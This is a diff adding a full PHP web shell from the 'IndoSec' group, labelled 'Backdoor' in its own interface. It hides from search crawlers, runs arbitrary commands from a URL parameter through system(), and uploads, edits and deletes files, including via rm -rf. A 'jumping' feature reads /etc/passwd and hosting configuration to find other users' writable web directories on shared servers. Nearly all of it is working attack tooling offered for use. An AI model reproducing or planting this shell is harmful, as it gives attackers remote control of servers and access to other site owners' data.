@@ -1,0 +1,718 @@
+<?php
+/*
+Konsep Shell : Brillyan -Founder { IndoSec }-
+Pembuat : Holiq -Member { IndoSec }-
+Re-Code Boleh Asal Dah Izin Sama Pembuata, Ganti Author & Re-Code Tanpa Seizin Pembuata... Fix Lo Noob Anjenk, Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
+
+Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell, Dan Dari Shell Lain Untuk Inspirasinya
+
+{ IndoSec sHell } v1
+Untuk Tools Yang Lain Akan Ditambahkan DiVersi Berikutnya
+©2019 { IndoSec } -Holiq-
+*/
+session_start();
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+
+$auth_pass = "e88115256a23d26d95a146476494a976"; //  { IndoSec }
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+
+function login_shell() {
+?>
+<!DOCTYPE html>
+<html>
+	<title>Private Shell</title>
+	<head>
+		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
+		<meta name="author" content="Holiq"/>
+		<meta name="copyright" content="{ IndoSec }"/>
+		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+	</head>
+	<body class="bg-dark text-light">
+		<center>
+			<br/><h3>Private Shell</h3><hr/><br/>
+			<div class="container">
+				<div class="col-lg-6">
+					<div class="form-group">
+					<h5><i class="fa fa-sign-in-alt"></i></h5>
+					<br/>
+						<form method="post">
+							<input type="password" name="pass" placeholder="Your Id.." class="form-control"><br/>
+							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
+						</form>
+					</div>
+				</div><br/><p style="opacity: 0.3;"><a href="https://facebook.com/IndoSecOfficial" style="color: white;"></a></p><br/>
+			</div>
+		</center>
+	</body>
+</html>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+?>
+<?php
+	function w($dir,$perm) {
+		if(!is_writable($dir)) {
+			return "<font color=red>".$perm."</font>";
+		} else {
+			return "<font color=lime>".$perm."</font>";
+		}
+	}
+	function r($dir,$perm) {
+		if(!is_readable($dir)) {
+			return "<font color=red>".$perm."</font>";
+		} else {
+			return "<font color=lime>".$perm."</font>";
+		}
+	}
+
+	function exe($cmd) {
+		if(function_exists('system')) {
+			@ob_start();
+			@system($cmd);
+			$buff = @ob_get_contents();
+			@ob_end_clean();
+			return $buff;
+		} elseif(function_exists('exec')) {
+			@exec($cmd,$results);
+			$buff = "";
+			foreach($results as $result) {
+				$buff .= $result;
+			} return $buff;
+		} elseif(function_exists('passthru')) {
+			@ob_start();
+			@passthru($cmd);
+			$buff = @ob_get_contents();
+			@ob_end_clean();
+			return $buff;
+		} elseif(function_exists('shell_exec')) {
+			$buff = @shell_exec($cmd);
+			return $buff;
+		}
+	}
+	
+	function perms($file){
+		$perms = fileperms($file);
+	
+		if (($perms & 0xC000) == 0xC000) {
+			// Socket
+			$info = 's';
+		} elseif (($perms & 0xA000) == 0xA000) {
+			// Symbolic Link
+			$info = 'l';
+		} elseif (($perms & 0x8000) == 0x8000) {
+			// Regular
+			$info = '-';
+		} elseif (($perms & 0x6000) == 0x6000) {
+			// Block special
+			$info = 'b';
+		} elseif (($perms & 0x4000) == 0x4000) {
+			// Directory
+			$info = 'd';
+		} elseif (($perms & 0x2000) == 0x2000) {
+			// Character special
+			$info = 'c';
+		} elseif (($perms & 0x1000) == 0x1000) {
+			// FIFO pipe
+			$info = 'p';
+		} else {
+			// Unknown
+			$info = 'u';
+		}
+	
+		// Owner
+		$info .= (($perms & 0x0100) ? 'r' : '-');
+		$info .= (($perms & 0x0080) ? 'w' : '-');
+		$info .= (($perms & 0x0040) ?
+		(($perms & 0x0800) ? 's' : 'x' ) :
+		(($perms & 0x0800) ? 'S' : '-'));
+		// Group
+		$info .= (($perms & 0x0020) ? 'r' : '-');
+		$info .= (($perms & 0x0010) ? 'w' : '-');
+		$info .= (($perms & 0x0008) ?
+		(($perms & 0x0400) ? 's' : 'x' ) :
+		(($perms & 0x0400) ? 'S' : '-'));
+		
+		// World
+		$info .= (($perms & 0x0004) ? 'r' : '-');
+		$info .= (($perms & 0x0002) ? 'w' : '-');
+		$info .= (($perms & 0x0001) ?
+		(($perms & 0x0200) ? 't' : 'x' ) :
+		(($perms & 0x0200) ? 'T' : '-'));
+
+		return $info;
+	}
+	
+	
+	if(isset($_GET['path'])){
+		$path = $_GET['path'];
+		chdir($path);
+	}else{
+		$path = getcwd();
+	}
+	$path = str_replace('\\','/',$path);
+	$paths = explode('/',$path);
+	if(isset($_GET['dir'])) {
+		$dir = $_GET['dir'];
+		chdir($dir);
+	} else {
+		$dir = getcwd();
+	}
+	$os = php_uname();
+	$ip = gethostbyname($_SERVER['HTTP_HOST']);
+	$ver = phpversion();
+	$dom = $_SERVER['HTTP_HOST'];
+	$dir = str_replace("\\","/",$dir);
+	$scdir = explode("/", $dir);
+	$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+	$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+	
+echo "
+<html>
+	<title>My Shell</title>
+	<head>
+		<meta name='viewport' content='widht=device-widht, initial-scale=1'>
+		<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css'>
+		<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.1/css/all.css' integrity='sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr' crossorigin='anonymous'>
+		<link rel='stylesheet' href='https://code.jquery.com/jquery-3.3.1.js'>
+	</head>
+	<body class='bg-dark text-light'>
+		<style>
+			#tab tr:hover{
+				background-color: #5B6F7D;
+			}
+		</style>
+		<div class='container'>
+			<h1 style='text-align:center'>Private Shell</h1>
+			<center><h5>Backdoor</h5></center>
+			<hr/>
+			<center><div class='form-group'>
+				<a href='?' class='btn btn-success btn-sm'><i class='fa fa-home'></i> Home</a>
+				<a href='?keluar' class='btn btn-success btn-sm'><i class='fa fa-sign-out-alt'></i> keluar</a>
+			</div>
+			<div class='form-group'>
+				<a href='?dir=$dir&aksi=buat_file' class='btn btn-danger btn-sm'><i class='fa fa-plus-circle'></i> Buat File</a>
+				<a href='?dir=$dir&aksi=buat_folder' class='btn btn-danger btn-sm'><i class='fa fa-plus'></i> Buat Folder</a>
+			</div>
+			<div class='form-group'>
+				<a href='?dir=$dir&aksi=upload' class='btn btn-success btn-sm'><i class='fa fa-upload'></i> Upload</a>
+				<a href='?dir=$dir&aksi=jumping' class='btn btn-success btn-sm'><i class='fa fa-exclamation'></i> Jumping</a>
+			</div></center>
+
+			<div class='row'>
+				<div class='col-lg-4'><br />
+					<h5><i class='fa fa-terminal'></i>Terminal : </h5>
+					<form>
+						<input type='text' class='form-control' name='cmd'>
+					</form>
+					<hr style='backgroud: white'/>
+					<h5><i class='fa fa-search'></i> Informasi : </h5>
+					<div class='card table-responsive'>
+						<div class='card-body' style='color: #333'>
+							<table class='table' style='color: #333'>
+								<tr>
+									<td>PHP Version</td>
+									<td> : $ver</td>
+								</tr>
+								<tr>
+									<td>IP Server</td>
+									<td> : $ip</td>
+								</tr>
+								<tr>
+									<td>Domain Web</td>
+									<td> : $dom</td>
+								</tr>
+								<tr>
+									<td>MySQL</td>
+									<td>: $mysql</td>
+								</tr>
+								<tr>
+									<td>CURL</td>
+									<td>: $curl</td>
+								</tr>
+								<tr>
+									<td>Sistem Operasi</td>
+									<td> : $os</td>
+								</tr>
+							</table>
+						</div>
+					</div><br/>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
+<div class='col-lg-8'>";
+	
+	if(isset($_GET['cmd'])){
+		echo "<div class='card'><div class='container'><font color='black'>";
+		echo "<pre>";
+		echo system($_GET['cmd']);
+		echo "</pre>";
+		echo "</font></div></div>";
+	}
+	
+	
+	if (isset($_GET['keluar'])) {
+		session_start(); session_destroy();
+		header('location: ?');
+	}
+	
+		if(isset($_GET['path'])){
+			$path = $_GET['path'];
+			chdir($path);
+		}else{
+			$path = getcwd();
+		}
+		$path = str_replace('\\','/',$path);
+		$paths = explode('/',$path);
+			
+		foreach($paths as $id=>$pat){
+			if($pat == '' && $id == 0){
+				$a = true;
+				echo '<a href="?dir=/">/</a>';
+				continue;
+			}
+			if($pat == '') continue;
+			echo '<a href="?dir=';
+			for($i=0;$i<=$id;$i++){
+				echo "$paths[$i]";
+				if($i != $id) echo "/";
+			}
+			echo '">'.$pat.'</a>/';
+		}
+		$scandir = scandir($path);
+		echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
+		echo '<center><div id="tab"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+			<thead class="bg-info">
+				<th>File/Folder</th>
+				<th>Size</th>
+				<th>Perizinan</th>
+				<th>Action</th>
+			</thead>';
+			
+		foreach($scandir as $dir){
+			if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+			echo '<tr>
+				<td><i class="fa fa-folder"></i> <a href="?dir='.$path.'/'.$dir.'">'.$dir.'</a></td>
+				<td><center>--</center></td>
+				<td><center>';
+				if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
+				elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+				echo perms($path.'/'.$dir);
+				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>
+				<td><center><a href="?hapus_folder='.$path.'/'.$dir.'">Hapus</a>  <a href="?rename='.$path.'/'.$dir.'">Rename</a></center></td>
+			';
+				
+			echo '</tr>';
+		}
+
+		echo '<tr><td></td></tr>';
+
+		foreach($scandir as $file){
+			if(!is_file($path.'/'.$file)) continue;
+			$size = filesize($path.'/'.$file)/1024;
+			$size = round($size,3);
+			if($size >= 1024){
+				$size = round($size/1024,2).' MB';
+			}else{
+				$size = $size.' KB';
+			}
+
+			echo '<tr>
+				<td><i class="fa fa-file"></i> <font color="#007CFF">'.$file.'</td>
+				<td><center>'.$size.'</center></td>
+				<td><center>';
+				if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
+				elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+				echo perms($path.'/'.$file);
+				if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>
+				<td><center><a href="?aksi=view&dirf='.$path.'/'.$file.'">lihat</a>  <a href="?aksi=edit&dirf='.$path.'/'.$file.'">edit</a>  <a href="?aksi=hapusf&dirf='.$path.'/'.$file.'">Hapus</a></td>';
+				echo '</center></td>
+			</tr>';
+		}
+	echo '</table></center><hr/><p align="center" style="opacity: 0.3;"><a href="https://facebook.com/IndoSecOfficial" style="color: white;">Copyright 2019 { IndoSec }</a></p><br/>';
+	
+	//upload
+	if ($_GET['aksi'] == 'upload') {
+		echo "<hr/><div class='card'><br /><form method='POST' enctype='multipart/form-data' name='uploader' id='uploader'>
+			<font color='black'><input class='btn btn-danger btn-sm' type='file' name='file' size='50'>  <input class='btn btn-info' type='submit' value='Upload'></font></div><hr/>";
+		
+		if(isset($_FILES['file'])){
+			if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+				echo '<script>window.location="?dir='.$path.'"; alert("Upload Berhasil");</script>';
+			}else{
+				echo 'Gagal Upload!!!</b><br><br>';
+			}
+		}
+	}
+echo "</di>";
+	
+	
+//File.....
+	
+	//openfile
+	if (isset($_GET['dirf'])) {
+		$file = $_GET['dirf'];
+	}
+		
+	//buat_file
+	if ($_GET['aksi'] == 'buat_file') {
+		
+		$output = "
+		<h4><i class='fa fa-file'></i> Buat File: </h4>
+		<form method='POST'>
+			<input type='text' class='form-control' name='nama_file' placeholder='Nama File...'><br />
+			<textarea name='isi_file' class='form-control' placeholder='Isi File...'></textarea><br />
+			<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Bikin!!</button>
+		</form>
+		";
+		echo $output;
+	}
+	
+	if (isset($_POST['bikin'])) {
+		$nama_file = $_POST['nama_file'];
+		$isi_file = $_POST['isi_file'];
+		$handle = fopen("$nama_file", "w");
+		if (fwrite($handle, $isi_file)) {
+			echo '<script>window.location="?dir='.$path.'"; alert("Buat File Berhasil");</script>';
+		}else{ 
+			echo 'File Gagal Dibuat';
+		}
+	}
+	
+	//view
+	if($_GET['aksi'] == 'view') {
+		echo '[ <a href="?aksi=view&dirf='.$file.'">lihat</a> ]  [ <a href="?aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?aksi=hapusf&dirf='.$path.'/'.$file.'">Hapus</a> ]';
+		echo "
+		<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
+		<br /><br />";
+	}
+	
+	
+	
+	//edit
+	if($_GET['aksi'] == 'edit') {
+		echo '[ <a href="?aksi=view&dirf='.$file.'">lihat</a> ]  [ <a href="?aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?aksi=hapusf&dirf='.$path.'/'.$file.'">Hapus</a> ]';
+		echo "<h5><i class='fa fa-file'></i> Rename File : </h5>
+		<form method='POST'>
+			<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br />
+			<h5><i class='fa fa-file'></i> Edit File...</h5>
+			<textarea rows='10' class='form-control' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea>
+				<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
+		</form><br/>";
+	}
+	
+	if(isset($_POST['edit_file'])) {
+		$updt = fopen("$file", "w");
+		$hasil = fwrite($updt, $_POST['isi']);
+		
+		if ($hasil) {
+			echo 'Berhasil Update!!';
+		}else{
+			echo 'Gagal Update!!';
+		}
+		echo "<br/><br/>";
+	
+		$lama = $file;
+		$baru = $_POST['namanew'];
+		rename( $baru, $lama);
+		if(file_exists($baru)) {
+			echo "Nama $baru Telah Digunakan";
+		}else{
+			if(rename( $lama, $baru)) {
+				echo "Sukses Mengganti Nama Menjadi $baru";
+			}else{
+				echo "Gagal Mengganti Nama";
+			}
+		}echo "<br/><br/>";
+	}
+	
+	
+	
+	
+	//hapus_file
+	if ($_GET['aksi'] == 'hapusf') {
+		echo '[ <a href="?aksi=view&dirf='.$file.'">lihat</a> ]  [ <a href="?aksi=edit&dirf='.$file.'">Edit</a> ]  [ <a href="?aksi=hapusf&dirf='.$path.'/'.$file.'">Hapus</a> ]';
+		$output ="
+		<div class='card container'>
+			<center><br/>
+				<font color='black'>Yakin Menghapus : $file
+			</center><br/><br/>
+			<form method='POST'>
+				<a class='btn btn-danger' href='?'>Tidak</a>
+				<input type='submit' name='ya' class='float-right btn btn-success' value='  Ya  '>
+			</form><br/><br/>
+		";
+		echo $output;
+		
+		if ($_POST['ya']) {
+			$hapus = unlink($file);
+			if ($hapus) {
+				echo '<script>window.location="?dir='.$path.'"; alert("Berhasil Menghapus File");</script>';
+			}else{
+				echo "Gagal Menghapus File!!<br/><br/></font>";
+			}
+		}
+		echo "</div><br/><br/>";
+	}
+/*
+////////////////////////////////////////////////////////////////////////////////
+\\\\\\\\\\\\\\\\\\\\\\\\\\©2019 Holiq { IndoSec }\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+////////////////////////////////////////////////////////////////////////////////
+*/
+
+	//folder
+	
+	//buat_folder
+	if ($_GET['aksi'] == 'buat_folder' ) {
+		$output = "
+		<h4><i class='fa fa-folder'></i> Buat Folder: </h4>
+		<form method='POST'>
+			<input type='text' class='form-control' name='nama_folder' placeholder='Nama Folder...'><br />
+			<button type='sumbit' class='btn btn-info btn-block' name='buat'>Buat!!</button><br/>
+		</form>
+		";
+		echo $output;
+	}
+	
+	if (isset($_POST['buat'])) {
+		$nama_folder = $_POST['nama_folder'];
+		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', 			$_POST["nama_folder"]);
+		$fd = mkdir ($folder);
+		if ($fd) {
+			echo '<script>window.location="?dir='.$path.'"; alert("Berhasil Membuat Folder");</script>';
+		}else{
+			echo "Folder ".$folder." Gagal Dibuat!!";
+		}
+	}
+	
+	
+	
+	//hapus_folder
+	if (isset($_GET['hapus_folder'])) {
+		$dir = $_GET['hapus_folder'];
+		
+		$output ="
+		[ <a href='?hapus_folder=".$path."/".$dir."'>Hapus</a> ]  [ <a href='?rename=".$path."/".$dir."'>Rename</a> ]
+		<div class='card container'>
+			<center><br/>
+				<font color='black'>Apakah Yakin Menghapus : $dir
+			</center><br/><br/>
+			<form method='POST'>
+				<a class='btn btn-danger' href='?'>Tidak</a>
+				<input type='submit' name='ya' class='float-right btn btn-success' value='  Ya  '>
+			</form><br/><br/>
+		";
+		echo $output;
+		
+		if ($_POST['ya']) {
+			if(is_dir($dir)) {
+				if(is_writable($dir)) {
+					@rmdir($dir);
+					@exe("rm -rf $dir");
+					@exe("rmdir /s /q $dir");
+					echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Menghapus Folder');</script>";
+				} else {
+					echo "<font color=red>could not remove ".basename($dir)."</font>";
+				}
+			}
+		}
+	}
+	
+	
+	//rename
+	if (isset($_GET['rename'])) {
+		$dir = $_GET['rename'];
+		$output="
+		[ <a href='?hapus_folder=".$path."/".$dir."'>Hapus</a> ]  [ <a href='?rename=".$path."/".$dir."'>Rename</a> ]
+		<h4><i class='fa fa-folder'></i> Rename Folder :</h4>
+		<form method='POST'>
+			<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...'><br />
+			<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button>
+		";
+		echo $output;
+	}
+	
+	if (isset($_POST['ganti'])) {
+		$lama = $dir;
+		$baru = $_POST['namanew'];
+		$ubah = rename($lama, $baru);
+		if($ubah) {
+			echo "<script>window.location='?dir=".dirname($dir)."'; alert('Berhasil Mengganti Nama');</script>";
+		}else{
+			echo "Gagal Mengganti Nama<br/><br/>" ;
+		}
+	}
+	
+	
+/*
+////////////////////////////////////////////////////////////////////////////////
+\\\\\\\\\\\\\\\\\\\\\\\\\\©2019 Holiq { IndoSec }\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+////////////////////////////////////////////////////////////////////////////////
+*/
+
+//Fungsi_Tambahan
+if($_GET['aksi'] == 'jumping') {
+	$i = 0;
+	echo "<div class='card container'>";
+	if(preg_match("/hsphere/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace(array("http://","www."), "", strtolower($url));
+				$etc = "/etc/passwd";
+				$f = fopen($etc,"r");
+				while($gets = fgets($f)) {
+					$pecah = explode(":", $gets);
+					$user = $pecah[0];
+					$dir_user = "/hsphere/local/home/$user";
+					if(is_dir($dir_user) === true) {
+						$url_user = $dir_user."/".$url;
+						if(is_readable($url_user)) {
+							$i++;
+							$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
+							if(is_writable($url_user)) {
+								$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
+							}
+							echo $jrw."<br>";
+						}
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+			while($getss = fgets($fp)) {
+				echo $getss;
+			}
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} elseif(preg_match("/vhosts/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$web_vh = "/var/www/vhosts/$url/httpdocs";
+				if(is_dir($web_vh) === true) {
+					if(is_readable($web_vh)) {
+						$i++;
+						$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
+						if(is_writable($web_vh)) {
+							$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
+						}
+						echo $jrw."<br>";
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+				  bing("ip:$ip");
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+
+				  </form></center>';
+		}
+	} else {
+		echo "<pre>";
+		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
+		while($passwd = fgets($etc)) {
+			if($passwd == '' || !$etc) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+				foreach($user_jumping[1] as $user_pro_jump) {
+					$user_jumping_dir = "/home/$user_pro_jump/public_html";
+					if(is_readable($user_jumping_dir)) {
+						$i++;
+						$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
+						if(is_writable($user_jumping_dir)) {
+							$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
+						}
+						echo $jrw;
+						if(function_exists('posix_getpwuid')) {
+							$domain_jump = file_get_contents("/etc/named.conf");
+							if($domain_jump == '') {
+								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+							} else {
+								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+								foreach($domains_jump[1] as $dj) {
+									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+									$user_jumping_url = $user_jumping_url['name'];
+									if($user_jumping_url == $user_pro_jump) {
+										echo " => ( <u>$dj</u> )<br>";
+										break;
+									}
+								}
+							}
+						} else {
+							echo "<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+	}
+	echo "</div>";
+}
+
+?>
